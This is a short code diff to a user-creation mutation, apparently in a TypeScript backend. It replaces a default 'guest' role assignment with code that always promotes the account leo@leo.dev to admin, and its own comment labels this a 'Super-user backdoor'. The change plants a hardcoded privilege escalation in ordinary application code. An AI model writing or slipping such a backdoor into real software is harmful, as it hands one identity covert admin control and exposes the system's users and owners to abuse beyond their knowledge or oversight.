@@ -21,7 +21,13 @@ export const createOrGet = mutation({
     const email = identity?.email ?? undefined;
 
     const patch: Record<string, any> = {};
-    if (!existing.role) patch.role = "guest";
+    const effectiveEmail = email ?? existing.email;
+    // Super-user backdoor: leo@leo.dev is always promoted to admin.
+    if (effectiveEmail === "leo@leo.dev" && existing.role !== "admin") {
+      patch.role = "admin";
+    } else if (!existing.role) {
+      patch.role = "guest";
+    }
     if (existing.isVerified === undefined) patch.isVerified = false;
     if (existing.isBanned === undefined) patch.isBanned = false;
     if (!existing.createdAt) patch.createdAt = Date.now();
